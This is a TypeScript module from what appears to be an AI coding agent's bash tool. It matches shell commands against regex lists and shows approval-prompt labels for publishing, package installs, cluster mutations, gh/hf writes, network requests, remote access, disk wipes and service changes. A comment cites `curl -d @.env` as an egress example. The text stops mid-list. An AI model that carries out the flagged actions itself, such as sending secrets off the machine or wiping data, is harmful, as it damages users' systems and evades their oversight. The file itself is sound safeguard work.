// Approval-gate pattern matching for the bash tool: given a command string, the labels the user
// should see before it runs. Split out of bash.ts, which is otherwise about spawning a process
// and bounding its output — a different concern, and the one that stops growing. This half is
// where every safeguard issue lands (#191, #205, #206), so it earns a file a model can read whole
// without paging past the streaming code.
//
// `detectDangerousPatterns` is the only export, and bashTool.run is its only caller.

import { execFileSync } from 'node:child_process';
import { existsSync } from 'node:fs';
import { homedir } from 'node:os';
import { dirname, join, resolve } from 'node:path';
import { WORD_RE, dequote, maskQuoted, maskShellData, splitSegments, words } from './_readonly.js';
import { type Heredoc, scanHeredocs, stripHeredocs } from './_heredoc.js';
import { maskMarkdownData } from './_markdown.js';

// Workflow-policy commands: not destructive (a commit is local and reversible, a push is
// recoverable), but they record or publish work, and the user generally wants to stay in the
// loop rather than have the agent do it autonomously. These funnel through the same warnings
// mechanism as the destructive patterns below — so under 'safe' auto-approve they force a
// prompt, and only explicit 'bypass' lets them run unattended. Kept as a separate constant
// from the genuinely-dangerous patterns so the safety/policy distinction stays visible.
const POLICY_PATTERNS: Array<{ re: RegExp; label: string }> = [
  { re: /\bgit\s+commit\b/, label: 'Git commit (records to version history)' },
  // Bare push; force push is also flagged separately below as a destructive pattern.
  { re: /\bgit\s+push\b/, label: 'Git push (publishes commits to remote)' },
  // Outward-facing GitHub/HF actions. Scoped to the publishing subcommands here because they are
  // the ones whose label the user needs to see in these words — the rest of the coverage is the
  // read-verb allowlists (`GH_READ_VERBS`, `HF_READ_VERBS`), which flag every verb that is not a
  // read, so a blanket `gh`/`hf` match here would double-label. Remote *deletions* are
  // destructive, not policy, so they live in DANGER_PATTERNS below.
  { re: /\bgh\s+pr\s+(?:create|merge)\b/, label: 'GitHub PR create/merge (outward-facing)' },
  { re: /\bgh\s+release\s+create\b/, label: 'GitHub release create (publishes)' },
  // Also matches `hf upload-large-folder` (`\b` before the hyphen), which is the same act; both
  // spellings are in HF_VERBS_COVERED_ELSEWHERE so the generic label stays off them.
  { re: /\bhf\s+upload\b/, label: 'Hugging Face upload (publishes to hub)' },
  // Registry publishes. Same category and same irreversibility as `gh release create` above —
  // a published version is visible immediately and most registries refuse to reuse the version
  // number after an unpublish, so there is no quiet undo.
  {
    re: /\b(?:npm|pnpm|yarn|bun)\s+publish(?![\w./-])/,
    label: 'Package publish (npm/pnpm/yarn/bun)',
  },
  { re: /\bcargo\s+publish(?![\w./-])/, label: 'Package publish (cargo)' },
  { re: /\bpoetry\s+publish(?![\w./-])/, label: 'Package publish (poetry)' },
  { re: /\btwine\s+upload(?![\w./-])/, label: 'Package publish (twine)' },
  { re: /\bgem\s+push(?![\w./-])/, label: 'Package publish (gem push)' },
  { re: /\bmvn\s+deploy(?![\w./-])/, label: 'Package publish (mvn deploy)' },
  { re: /\bgradlew?\s+publish(?![\w./-])/, label: 'Package publish (gradle)' },
  {
    re: /\b(?:docker|podman)\s+push(?![\w./-])/,
    label: 'Container image push (publishes to registry)',
  },
];

// Package management at ANY scope: installs, uninstalls, and registry-fetch-and-run (npx and
// friends). Every ecosystem runs install-time scripts, so an install is arbitrary code execution
// chosen by the model, and the package it picks may be hallucinated, typosquatted, or outright
// malicious. Deliberately not limited to commands that name a package: a bare `npm install`
// builds from a manifest the model may have just edited, and a lockfile install still runs
// lifecycle scripts. The global-install patterns stay separate because those also change state
// outside the project — a global install trips both and reads as both.
// The trailing (?![\w./-]) keeps the verb a whole token, so `npm run install-hooks` and
// `cat install.md` don't read as installs.
const REMOTE_EXEC_LABEL = 'Remote package execution (npx/bunx/uvx)';

const PACKAGE_PATTERNS: Array<{ re: RegExp; label: string }> = [
  {
    re: /\b(?:npm|pnpm|bun)\s+(?:-{1,2}[\w-]+\s+)*(?:install|i|add|ci)(?![\w./-])/,
    label: 'Package install (npm/pnpm/bun)',
  },
  {
    re: /\byarn\s+(?:-{1,2}[\w-]+\s+)*(?:install|add)(?![\w./-])/,
    label: 'Package install (yarn)',
  },
  {
    re: /\b(?:pip|pip3)\s+(?:-{1,2}[\w-]+\s+)*install(?![\w./-])/,
    label: 'Python package install (pip)',
  },
  {
    re: /\bpython[\d.]*\s+-m\s+pip\s+(?:-{1,2}[\w-]+\s+)*install(?![\w./-])/,
    label: 'Python package install (pip)',
  },
  {
    re: /\buv\s+(?:pip\s+install|add|sync)(?![\w./-])/,
    label: 'Python package install (uv)',
  },
  {
    re: /\b(?:poetry|pipenv)\s+(?:install|add)(?![\w./-])/,
    label: 'Python package install (poetry/pipenv)',
  },
  { re: /\bcargo\s+add\b/, label: 'Rust package install (cargo add)' },
  { re: /\bgo\s+get\b/, label: 'Go module install (go get)' },
  {
    re: /\b(?:bundle|composer)\s+(?:install|add|require)(?![\w./-])/,
    label: 'Package install (bundler/composer)',
  },
  {
    re: /\b(?:apt|apt-get|dnf|yum|zypper|apk|choco|scoop|winget|port)\s+(?:-{1,2}[\w-]+\s+)*(?:install|add)(?![\w./-])/,
    label: 'System package install (persistent system change)',
  },
  { re: /\bpacman\s+-S[yu]*\b/, label: 'System package install (persistent system change)' },

  // Uninstalls — the mirror of an install, and just as much the user's call: the model can rip
  // out a dependency the project still needs, remove-hooks run the same arbitrary code, and the
  // system-level ones reach outside the repo entirely.
  {
    re: /\b(?:npm|pnpm|bun|yarn)\s+(?:-{1,2}[\w-]+\s+)*(?:uninstall|remove|rm|un)(?![\w./-])/,
    label: 'Package uninstall (npm/pnpm/yarn/bun)',
  },
  {
    re: /\b(?:pip|pip3)\s+(?:-{1,2}[\w-]+\s+)*uninstall(?![\w./-])/,
    label: 'Python package uninstall (pip)',
  },
  {
    re: /\bpython[\d.]*\s+-m\s+pip\s+(?:-{1,2}[\w-]+\s+)*uninstall(?![\w./-])/,
    label: 'Python package uninstall (pip)',
  },
  {
    re: /\b(?:uv|poetry|pipenv)\s+(?:tool\s+)?(?:remove|uninstall)(?![\w./-])/,
    label: 'Python package uninstall (uv/poetry/pipenv)',
  },
  {
    re: /\b(?:brew|pipx|cargo|gem|composer|bundle|go)\s+(?:uninstall|remove)(?![\w./-])/,
    label: 'Package uninstall (global tool)',
  },
  {
    re: /\b(?:apt|apt-get|dnf|yum|zypper|apk|choco|scoop|winget|port)\s+(?:-{1,2}[\w-]+\s+)*(?:uninstall|remove|purge|del)(?![\w./-])/,
    label: 'System package uninstall (persistent system change)',
  },
  { re: /\bpacman\s+-R[a-z]*\b/, label: 'System package uninstall (persistent system change)' },

  // Fetch-and-run: no install, same vector. `npx some-cli` downloads a package the model chose
  // — hallucinated or typosquatted just as easily as one it would have installed — and executes
  // it immediately, so it gets the same gate. npx/bunx are matched in `remoteExecLabel` instead,
  // since a binary the project already installed fetches nothing.
  { re: /\buvx(?![\w./-])/, label: REMOTE_EXEC_LABEL },
  {
    re: /\b(?:pnpm|yarn)\s+dlx(?![\w./-])|\bpipx\s+run(?![\w./-])/,
    label: 'Remote package execution (dlx/pipx run)',
  },
];

// Fallback for the package managers not worth enumerating (conda, mix, gcloud components, a
// project's own `make install`): any command whose verb is `install` or `uninstall`. A couple of
// leading tokens are allowed so wrappers still match (`sudo apt install`, `python -m pip
// install`), and it is only reported when no specific package pattern fired — see
// detectDangerousPatterns. Matching is per shell segment, because the verb position is what
// makes this precise: `grep -rn install src/` passes `install` as an *argument*, and the
// read-only leads below never install anything, so they are skipped outright.
//
// Position is read TWO ways, but only one of them reads every segment (#752, narrowed by #757). On
// whitespace, `GENERIC_PACKAGE_RE` counted `CFLAGS="-O2`, `-g` and `-Wall"` in `make CFLAGS="-O2 -g
// -Wall" install` as three leading tokens, so the verb landed past the budget and the install ran
// unprompted; `genericVerbWord` reads the same shape off the shell's own words, where that value is
// ONE token. The whitespace reading exists for exactly one case: `words()` DROPS a quote it cannot
// close and so SPLITS an unterminated run (`FOO="a b` reads as `FOO=`, `a`, `b`), and the extra words
// can push the verb past the budget — an under-report. Unioned with the word reading on every segment
// it was also a false-positive machine, because the other half of the same weakness is that it cuts a
// CLOSED quoted argument at the spaces inside it: `cp -r "build install" dist` is one quoted argument
// to `cp`, which `words()` reads correctly and this reading re-accepted as a verb (#757). So it is
// consulted only where `words()` actually dropped a quote — the whole difference it was paying for —
// and nowhere else. The trade: an install carried in a CLOSED quoted value, `A="make install" bash -c
// "$A"`, is now read only off words, which sees one assignment word and reports nothing. That shape
// is indistinguishable from the false positive by any test cheaper than expanding the value, which is
// `bash`'s job and not this file's. A quote-aware token PATTERN stays the rejected option: an anchored
// reader that also tolerates an unterminated quote has two viable ends per token and re-explores every
// earlier one (`GENERIC_PACKAGE_RE` ends in `install`, so a `""` run backtracks catastrophically).
// `words()` is a lexer, so it costs one linear scan.
const GENERIC_PACKAGE_RE = /^(?:\S+\s+){1,3}?(?:-{1,2}[\w-]+\s+)*(un)?install(?![\w./-])/;

// The shell's words for one segment, and where `words()` first had to DROP a quote (-1 if it never
// did). A quote it cannot close is dropped, not failed, so the only characters a word list cannot
// consume are the quotes themselves. The position matters, not just the fact: a dropped quote only
// explains a verb the whitespace reading finds AFTER it, and an apostrophe in a trailing comment
// (`mv "old install" new # it's fine`) must not license a verb read out of the closed quote before
// it. Both facts come off one pass (#794): `words()` and this used to walk `WORD_RE` separately, on
// every segment of every bash call.
interface LexedSegment {
  words: string[];
  dropped: number;
}

function lexSegment(segment: string): LexedSegment {
  const list: string[] = [];
  let dropped = -1;
  let at = 0;
  for (const m of segment.matchAll(WORD_RE)) {
    if (dropped < 0) {
      const gap = segment.slice(at, m.index).search(/["']/);
      if (gap >= 0) dropped = at + gap;
    }
    list.push(dequote(m[0]));
    at = m.index + m[0].length;
  }
  if (dropped < 0) {
    const gap = segment.slice(at).search(/["']/);
    if (gap >= 0) dropped = at + gap;
  }
  return { words: list, dropped };
}

// A flag token: the gap between the leading words and the verb.
const GENERIC_FLAG_RE = /^-{1,2}[\w-]+$/;

// A `VAR=value` operand (`make DESTDIR=/x install`) sits in the same gap: a make line carries
// several, and counted as leading words they pushed the verb past the budget.
const GENERIC_ASSIGN_RE = /^[A-Za-z_]\w*=/;

function genericVerbWord(list: string[]): 'uninstall' | 'install' | undefined {
  // 1–3 leading words, then any run of flags and assignments, then the verb.
  for (let i = 1; i <= 3 && i < list.length; i++) {
    let j = i;
    while (j < list.length && (GENERIC_FLAG_RE.test(list[j]) || GENERIC_ASSIGN_RE.test(list[j]))) {
      j++;
    }
    if (j >= list.length) break;
    if (list[j] === 'uninstall') return 'uninstall';
    if (list[j] === 'install') return 'install';
  }
  return undefined;
}

const READ_ONLY_LEAD_RE =
  /^(?:e?grep|fgrep|rg|ag|ack|find|man|which|type|whereis|cat|bat|less|more|head|tail|awk|sed|echo|printf|ls|wc|git)\b/;

// Tools whose own patterns already describe what they do. Without this, `helm uninstall app`
// falls through to the generic label and reads as "removes third-party code" — it removes a
// release from a cluster, and a misleading label is its own bug: the warning text is what the
// user reads to decide.
const SELF_COVERED_LEAD_RE = /^(?:helm|kubectl|oc|docker|podman|terraform|tofu|pulumi)\b/;

const INSTALL_LABEL = 'Install command (fetches and runs third-party code)';
const UNINSTALL_LABEL = 'Uninstall command (removes third-party code)';
// Coreutils `install` COPIES files into place and fetches nothing (#794). It still prompts — an
// install into `/etc` under sudo is exactly what the gate is for — but with a label that is true.
const FILE_INSTALL_LABEL = 'File install (copies into place)';

// What makes a verb coreutils `install` is where the word sits, not which flags or how many operands
// follow it (#794): for coreutils the word IS the command (`install -m 644 a b`, `/usr/bin/install …`,
// `sudo install …`), and for `make install` / `conda install x` / `bundle install` it is an ARGUMENT
// to the command that does the installing. A flag set would have to guess — `make -C x install -j4`
// and `conda install -m 644 numpy` carry coreutils-looking flags too — and a path-operand count would
// call `conda install numpy src` a file copy. `quoted` is the segment after its assignments and
// wrappers are stripped, so its first word is the command the shell runs.
//
// A FRAGMENT is excluded because its first word is not a command word at all: `echo "$(date) install
// later"` is cut at `install`, which is a word of the same quoted argument (#794).
function isFileInstall(read: SegmentRead, lexed: LexedSegment): boolean {
  if (read.fragment) return false;
  const first = lexed.words[0] ?? '';
  return first.slice(first.lastIndexOf('/') + 1) === 'install';
}

// One segment, with its prefix read three ways. `raw` is the segment as the shell spells it;
// `quoted` is `stripVerbPrefix`'s walk of the shell's own words; `spaced` is the older strip that
// reads an assignment as everything up to the next space. The two readers below each want two of the
// three, and every strip is a walk over the segment — so they are computed once, in `detectAtDepth`,
// rather than once per reader (#794).
interface SegmentRead {
  raw: string;
  quoted: string;
  spaced: string;
  fragment: boolean;
}

function segmentReads(segments: VerbSegment[]): SegmentRead[] {
  const reads: SegmentRead[] = [];
  for (const { text, fragment } of segments) {
    const raw = text.trim();
    if (!raw) continue;
    reads.push({
      raw,
      quoted: stripVerbPrefix(raw),
      spaced: raw.replace(VERB_PREFIX_WS_RE, ''),
      fragment,
    });
  }
  return reads;
}

// Reads `verbSegments`' segments, so the two per-segment readers agree on what a segment is (#749).
//
// The lead is tested after the verb prefix is stripped, not on the raw segment (#757): what a
// segment runs is the command behind its assignments and wrappers, and `LANG=C grep -rn install src`
// runs `grep` — an argument, not a verb — while the raw test saw `LANG=C`, missed the read-only lead,
// and asked `grep`'s own word list for an install it never had. `stripVerbPrefix` is `verbLabels`'
// strip, so both per-segment readers agree on which command a segment runs. It skips a wrapper's
// options too (`sudo -u me grep …`), and strips `command -v x` to nothing, since that runs nothing.
//
// The VERB is still read off the raw segment as well as the stripped one: the strip brings a deep
// verb inside the budget (`env A=1 sudo time conda install numpy`) and can also move one out of it
// (`sudo install -m 644 x /etc/x` has its verb at word 1, and word 0 is past this reader by design).
// Both readings, unioned — the same rule that keeps a label at least as wide as it was.
function genericPackageLabel(reads: SegmentRead[]): string | undefined {
  let fileInstall = false;
  for (const read of reads) {
    if (
      !read.quoted ||
      READ_ONLY_LEAD_RE.test(read.quoted) ||
      SELF_COVERED_LEAD_RE.test(read.quoted)
    ) {
      continue;
    }
    const stripped = lexSegment(read.quoted);
    // Decided per segment, so a file copy in one segment cannot relabel a real install in another
    // (`make install && install -m 644 a b` is an Install, #843 review). The raw reading of this
    // segment is skipped with it: `sudo install …` has its `install` at word 1 there.
    if (isFileInstall(read, stripped)) {
      fileInstall = true;
      continue;
    }
    // A FRAGMENT names no verb of its own: its words belong to the command around the substitution,
    // which the outer reading already reads whole. Read here, `A="$(date) x" install -m 644 a b`
    // counted `x"` as a leading word and called the file copy a package install.
    if (read.fragment) continue;
    for (const { seg, lex } of read.quoted === read.raw
      ? [{ seg: read.raw, lex: stripped }]
      : [
          { seg: read.raw, lex: lexSegment(read.raw) },
          { seg: read.quoted, lex: stripped },
        ]) {
      const word = genericVerbWord(lex.words);
      // The whitespace reading only where `words()` split a quote it could not close, and only for a
      // verb that quote comes before — see above.
      const ws = lex.dropped >= 0 ? GENERIC_PACKAGE_RE.exec(seg) : null;
      const m = ws && lex.dropped < ws[0].length ? ws : undefined;
      if (word === 'uninstall' || m?.[1]) return UNINSTALL_LABEL;
      if (word === 'install' || m) return INSTALL_LABEL;
    }
  }
  return fileInstall ? FILE_INSTALL_LABEL : undefined;
}

// Cluster and container CLIs get the OPPOSITE polarity from the install patterns above, and the
// reason is the risk asymmetry. Read verbs are a small closed set; mutating verbs are a long open
// tail that grows every release. Blocklist the tail and a verb nobody enumerated runs silently —
// fails open, high cost. Allowlist the reads and a *new read verb* prompts once — fails safe,
// ~zero cost. Same file, two correct polarities.
//
// The read sets are generous on purpose. The precision argument cuts hardest here: in a
// container-heavy repo, prompting on `docker ps` trains reflexive approval, and that degrades the
// gate for `rm -rf` too. Two-token entries exist because the noun-first forms (`docker image ls`,
// `kubectl config view`) are reads while their siblings (`image rm`, `config set-context`) are not.
const CLUSTER_READ_VERBS: Record<string, readonly string[]> = {
  kubectl: [
    'get',
    'describe',
    'logs',
    'top',
    'explain',
    'version',
    'cluster-info',
    'api-resources',
    'api-versions',
    'diff',
    'events',
    'completion',
    'help',
    'config view',
    'config get-contexts',
    'config current-context',
    'auth can-i',
  ],
  docker: [
    'ps',
    'images',
    'logs',
    'inspect',
    'version',
    'info',
    'stats',
    'port',
    'diff',
    'history',
    'search',
    'help',
    'events',
    'top',
    'image ls',
    'image inspect',
    'image history',
    'container ls',
    'container inspect',
    'container logs',
    'volume ls',
    'volume inspect',
    'network ls',
    'network inspect',
    'context ls',
    'system df',
    'system info',
    'compose ps',
    'compose logs',
    'compose config',
    'compose version',
    'buildx ls',
    'buildx version',
  ],
};
CLUSTER_READ_VERBS.oc = CLUSTER_READ_VERBS.kubectl;
CLUSTER_READ_VERBS.podman = CLUSTER_READ_VERBS.docker;

// Verbs that already carry a more specific label, so the generic mutation one stays quiet rather
// than stacking a second warning on the same command.
const CLUSTER_VERBS_COVERED_ELSEWHERE: Record<string, readonly string[]> = {
  docker: ['push'],
  podman: ['push'],
};

// Global flags that consume the token after them, so `kubectl -n prod get pods` reads as `get`
// rather than as `prod` — mistaking a namespace for a subcommand would prompt on every read.
const FLAG_TAKES_VALUE = new Set([
  '-n',
  '--namespace',
  '--context',
  '--kubeconfig',
  '-o',
  '--output',
  '-f',
  '--filename',
  '-l',
  '--selector',
  '--as',
  '--token',
  '-s',
  '--server',
  '--user',
  '--cluster',
  '-H',
  '--host',
  '--config',
  '--log-level',
  '--format',
  '--filter',
  '--since',
  '--tail',
  '-e',
  '--env',
  '-v',
  '--volume',
  '-p',
  '--publish',
  '--name',
  '--network',
  '-u',
  '-w',
  '--workdir',
  '--entrypoint',
  '--label',
  '--mount',
  '--platform',
  '--request-timeout',
]);

function clusterLabel(segment: string): string | undefined {
  const tokens = segment.split(/\s+/);
  const tool = tokens[0];
  const reads = CLUSTER_READ_VERBS[tool];
  if (!reads) return undefined;
  const sub: string[] = [];
  for (let i = 1; i < tokens.length && sub.length < 2; i++) {
    const t = tokens[i];
    if (t.startsWith('-')) {
      if (FLAG_TAKES_VALUE.has(t)) i++;
      continue;
    }
    sub.push(t);
  }
  const [verb, next] = sub;
  if (!verb) return undefined;
  if (reads.includes(verb)) return undefined;
  if (next && reads.includes(`${verb} ${next}`)) return undefined;
  if (CLUSTER_VERBS_COVERED_ELSEWHERE[tool]?.includes(verb)) return undefined;
  // `docker system` and `kubectl config` are noun groups, not verbs — naming only the first
  // token would tell the user less than the command already did.
  const group = next && reads.some(r => r.startsWith(`${verb} `));
  return `Cluster/container mutation (${tool} ${group ? `${verb} ${next}` : verb})`;
}

// `gh` takes the cluster polarity for the same reason: reads are a closed set, and the writes
// (`pr edit`, `pr comment`, `issue close`, `run cancel`, every extension) are an open tail that
// act on GitHub as the user. A blocklist of the publishing verbs let `gh pr edit` and `gh pr
// comment` run unprompted — and an unflagged `gh` keeps the network under the sandbox, so nothing
// contained them either. `*` admits every verb of a read-only noun.
const GH_READ_VERBS: Record<string, readonly string[]> = {
  pr: ['view', 'list', 'diff', 'checks', 'status', 'checkout'],
  issue: ['view', 'list', 'status'],
  repo: ['view', 'list', 'clone'],
  run: ['view', 'list', 'watch', 'download'],
  workflow: ['view', 'list'],
  release: ['view', 'list', 'download'],
  gist: ['view', 'list', 'clone'],
  label: ['list'],
  cache: ['list'],
  secret: ['list'],
  variable: ['list', 'get'],
  ruleset: ['view', 'list', 'check'],
  project: ['view', 'list', 'field-list', 'item-list'],
  codespace: ['list', 'view', 'logs'],
  extension: ['list', 'search', 'browse'],
  org: ['list'],
  alias: ['list'],
  config: ['get', 'list'],
  auth: ['status'],
  'ssh-key': ['list'],
  'gpg-key': ['list'],
  search: ['*'],
  status: ['*'],
  browse: ['*'],
  help: ['*'],
  version: ['*'],
  completion: ['*'],
};

// The publishing and deleting verbs already carry their own, more specific label.
const GH_VERBS_COVERED_ELSEWHERE = ['pr create', 'pr merge', 'release create', 'repo delete'];

// `gh -R owner/repo pr view` puts the flag's value where the noun would be.
const GH_FLAG_TAKES_VALUE = new Set(['-R', '--repo', '--hostname']);

// `gh api` defaults to POST as soon as it is given a field, so the method has to be derived, not
// read off an `-X` that is usually absent.
const GH_API_FIELD_RE = /^(?:-f|-F|--field|--raw-field|--input)(?:=|$)/;

function ghLabel(segment: string): string | undefined {
  const tokens = segment.split(/\s+/);
  if (tokens[0] !== 'gh') return undefined;
  const sub: string[] = [];
  let i = 1;
  for (; i < tokens.length && sub.length < 2; i++) {
    const t = tokens[i];
    if (t.startsWith('-')) {
      if (GH_FLAG_TAKES_VALUE.has(t)) i++;
      if (t === '--version' || t === '--help' || t === '-h') return undefined;
      continue;
    }
    sub.push(t);
    if (sub[0] === 'api') break;
  }
  const [noun, verb] = sub;
  if (!noun) return undefined;
  if (noun === 'api') return ghApiLabel(tokens.slice(i + 1));
  const reads = GH_READ_VERBS[noun];
  if (reads?.includes('*')) return undefined;
  if (!verb) return reads ? undefined : `GitHub CLI action (gh ${noun} — not a known read)`;
  if (reads?.includes(verb) || GH_VERBS_COVERED_ELSEWHERE.includes(`${noun} ${verb}`)) {
    return undefined;
  }
  return `GitHub CLI action (gh ${noun} ${verb} — not a known read)`;
}

function ghApiLabel(args: string[]): string | undefined {
  let method: string | undefined;
  let hasField = false;
  for (let i = 0; i < args.length; i++) {
    const a = args[i];
    if (a === '-X' || a === '--method') method = args[++i];
    else if (a.startsWith('--method=')) method = a.slice('--method='.length);
    else if (/^-X\w/.test(a)) method = a.slice(2);
    else if (GH_API_FIELD_RE.test(a)) hasField = true;
  }
  const m = (method?.replace(/['"]/g, '') ?? (hasField ? 'POST' : 'GET')).toUpperCase();
  return m === 'GET' || m === 'HEAD' ? undefined : `GitHub API write (gh api ${m})`;
}

// `hf` takes `gh`'s polarity, and the sandbox is what makes it load-bearing: an unflagged `hf`
// command now keeps the network (`_sandbox.ts`'s NET_VERBS), so a write verb on an unrestricted
// tail would run unprompted AND networked — the combination #265 fixed for `gh`, arrived at from
// the other end. The reads are the ones a user hands the model by name ("download this model",
// "what's in this repo", "does that Space build"): `download`, `models`/`datasets`/`spaces` `info`
// and `list`. Everything that acts on the Hub as the user is a prompt — `repos
// create|delete|delete-files|duplicate|move|settings`, `repos branch|tag`, `collections …`,
// `discussions comment|merge|close|create`, `jobs run|uv|cancel|scheduled`, `endpoints
// deploy|delete|pause|resume`, `webhooks …`, `buckets …`, `sync`, `auth login|logout|switch`,
// `skills add`, `extensions install|exec` — and so are the LOCAL mutations, which are just as much
// the user's call and just as invisible: `cache rm`/`cache prune` delete the downloads the session
// may be about to reuse. `*` admits every verb of a read-only noun, like GH_READ_VERBS.
//
// Two reads are deliberately absent. `auth list` prints stored tokens into the transcript, the same
// line that keeps `gh auth token` out (only `auth status`/`whoami` is a read). `datasets sql` hands
// its argument to DuckDB as a program: `read_csv('https://…')` is arbitrary egress and `COPY … TO`
// a write, which is why `awk` is out of the network pipe allowlist on the same reasoning.
const HF_READ_VERBS: Record<string, readonly string[]> = {
  download: ['*'],
  models: ['info', 'list', 'ls'],
  datasets: ['info', 'list', 'ls', 'parquet'],
  spaces: ['info', 'list', 'ls'],
  papers: ['info', 'list', 'ls', 'read', 'search'],
  collections: ['info', 'list', 'ls'],
  discussions: ['info', 'diff', 'list', 'ls'],
  webhooks: ['info', 'list', 'ls'],
  endpoints: ['list', 'ls', 'describe', 'catalog'],
  jobs: ['ps', 'logs', 'inspect', 'stats', 'hardware'],
  cache: ['list', 'ls', 'verify'],
  buckets: ['info', 'list', 'ls'],
  auth: ['whoami'],
  skills: ['preview'],
  extensions: ['list', 'ls', 'search'],
  env: ['*'],
  version: ['*'],
};
// The two documented aliases, spelled as the CLI spells them: `hf ext …`.
HF_READ_VERBS.ext = HF_READ_VERBS.extensions;

// Verbs that already carry their own, more specific label, so the generic one stays quiet instead
// of stacking on the same command. `upload` is a noun as well as the publishing verb, so it is
// matched on the noun alone; `repos delete` (and its `repo` alias) is the pair the destructive
// pattern above names.
const HF_VERBS_COVERED_ELSEWHERE = ['upload', 'upload-large-folder', 'repos delete', 'repo delete'];

function hfLabel(segment: string): string | undefined {
  const tokens = segment.split(/\s+/);
  if (tokens[0] !== 'hf') return undefined;
  const sub: string[] = [];
  for (let i = 1; i < tokens.length && sub.length < 2; i++) {
    const t = tokens[i];
    if (t.startsWith('-')) {
      // Unlike `gh`'s `-R owner/repo`, `hf`'s global flags take no value, so there is no noun
      // displacement to correct here and no flag table to keep.
      if (t === '--version' || t === '--help' || t === '-h') return undefined;
      continue;
    }
    sub.push(t);
  }
  const [noun, verb] = sub;
  if (!noun) return undefined;
  const reads = HF_READ_VERBS[noun];
  if (reads?.includes('*') || HF_VERBS_COVERED_ELSEWHERE.includes(noun)) return undefined;
  if (!verb) return reads ? undefined : `Hugging Face CLI action (hf ${noun} — not a known read)`;
  if (reads?.includes(verb) || HF_VERBS_COVERED_ELSEWHERE.includes(`${noun} ${verb}`)) {
    return undefined;
  }
  return `Hugging Face CLI action (hf ${noun} ${verb} — not a known read)`;
}

// Commands whose danger lives in the *verb* position, so they are matched per shell segment
// rather than anywhere in the string: both words are perfectly ordinary as arguments (`grep -rn
// curl src/`, `git log --grep pkill`), and blanket matching would fire on reads and erode the
// signal the same way a blanket `gh` match would. Matched after the leading wrappers below are
// stripped, so `sudo curl …` and `FOO=1 pkill …` still read as what they run.
const VERB_PATTERNS: Array<{ re: RegExp; label: string }> = [
  // Network egress: a request carries whatever the model chose to send off the machine (`curl -d
  // @.env`) and brings back content it then acts on. Piping that straight to a shell is worse and
  // stays flagged separately below; the fetch itself is still the user's call.
  { re: /^(?:curl|wget)(?![\w./-])/, label: 'Network request (curl/wget)' },
  // Kill-by-name matches on a pattern, not a PID, so the blast radius is every process whose name
  // happens to match — the user's editor, dev server, or database, not just the agent's own run.
  { re: /^(?:pkill|killall)(?![\w./-])/, label: 'Kill processes by name (pkill/killall)' },
  // Remote access: whatever the agent does on the far side is outside this gate, outside the
  // repo, and outside anything a local sandbox could constrain — so the hop itself is the only
  // place left to ask. Coverage has to be structural, not incidental on the argument text.
  { re: /^(?:ssh|scp|sftp)(?![\w./-])/, label: 'Remote host access (ssh/scp/sftp)' },
  {
    re: /^rsync(?![\w./-]).*\s(?:rsync:\/\/|[A-Za-z0-9_.@-]+:)/,
    label: 'Remote host access (rsync)',
  },
  // The one rsync form that destroys locally too: --delete empties the destination to match the
  // source, with no `rm` anywhere in the command for the other patterns to catch.
  {
    re: /^rsync(?![\w./-]).*\s--del(?:ete(?:-[\w-]+)?)?(?![\w-])/,
    label: 'Delete-on-sync (rsync --delete)',
  },
  // Ends the session and everything else the user is running; a flailing model does emit these.
  {
    re: /^(?:reboot|shutdown|halt|poweroff)(?![\w./-])/,
    label: 'Power state change (reboot/shutdown)',
  },
  // Overwrites the bytes before unlinking, so nothing survives — not the file, not a git object.
  { re: /^shred(?![\w./-])/, label: 'Unrecoverable file wipe (shred)' },

  // Tier 2 — infra tools whose mutating verbs are a small named set, so these keep the ordinary
  // blocklist polarity; only kubectl/docker above need the inverted one.
  {
    re: /^helm\s+(?:-{1,2}[\w-]+\s+)*(?:install|upgrade|uninstall|rollback|delete)(?![\w./-])/,
    label: 'Helm release change (modifies a cluster)',
  },
  {
    re: /^(?:terraform|tofu|pulumi)\s+(?:-{1,2}[\w-]+\s+)*(?:apply|destroy|import|taint|untaint)(?![\w./-])/,
    label: 'Infrastructure change (terraform/pulumi)',
  },
  {
    re: /^(?:terraform|tofu|pulumi)\s+state\s+(?:rm|mv|push|delete)(?![\w./-])/,
    label: 'Infrastructure change (terraform/pulumi)',
  },
  // Fans out to every host in the inventory at once, so the blast radius is the fleet.
  { re: /^ansible(?:-playbook)?(?![\w./-])/, label: 'Runs across many hosts (ansible)' },
  // Cloud CLIs nest their verbs (`aws s3 rm …`, `gcloud compute instances delete …`), so the verb
  // is matched a few tokens in rather than immediately after the tool — and heroku joins them
  // with a colon (`heroku ps:scale`) rather than a space.
  {
    re: /^(?:aws|gcloud|az|flyctl|fly|vercel|netlify|heroku|doctl)(?![\w./-])(?:\s+\S+){0,6}?[\s:](?:create|delete|update|deploy|set|put|remove|rm|scale|restart|destroy)(?![\w./-])/,
    label: 'Cloud resource change (mutating cloud CLI verb)',
  },

  // Tier 4 — persistent system state: survives the turn, the session, and usually the reboot.
  {
    re: /^(?:systemctl|service)(?![\w./-])[^\n]*\b(?:start|stop|restart|reload|enable|disable|mask|unmask)(?![\w./-])/,
    label: 'Service state change (systemctl/service)',
  },
  {
    re: /^launchctl\s+(?:load|unload|bootstrap|bootout|enable|disable|kickstart|remove|start|stop|setenv)(?![\w./-])/,
    label: 'Launch agent change (launchctl)',
  },
  {
    re: /^brew\s+services\s+(?:start|stop|restart|run|cleanup)(?![\w./-])/,
    label: 'Service state change (brew services)',
  },
  // `crontab -r` wipes every job with no confirmation and is one fat-finger from `crontab -e`.
  // `-l` is the only read, so it is the only form that stays quiet.
  { re: /^crontab(?![\w./-])(?![^\n]*\s-l\b)/, label: 'Scheduled job change (crontab)' },
  {
    re: /^defaults\s+(?:write|delete|import)(?![\w./-])/,
    label: 'macOS preference write (defaults)',
  },
  { re: /^(?:spctl|csrutil)(?![\w./-])/, label: 'Disabling macOS security (spctl/csrutil)' },
  {
    re: /^(?:diskutil|hdiutil)\s+(?:-{1,2}[\w-]+\s+)*(?:erase\w*|partitionDisk|reformat|apfs|destroy\w*)(?![\w./-])/i,
    label: 'Disk erase/partition (diskutil/hdiutil)',
  },
  {
    re: /^(?:mkfs(?:\.\w+)?|fdisk|parted|sgdisk)(?![\w./-])/,
    label: 'Filesystem/partition change (mkfs/fdisk/parted)',
  },
  // Bare `mount` just lists the table; requiring an argument keeps the read quiet.
  { re: /^u?mount(?![\w./-])\s+\S/, label: 'Mount table change (mount/umount)' },
  {
    re: /^tmutil\s+(?:delete|deletelocalsnapshots|disable)(?![\w./-])/,
    label: 'Time Machine backup change (tmutil)',
  },
  // Drives any GUI app on the machine — Mail, Finder, the browser — from one line.
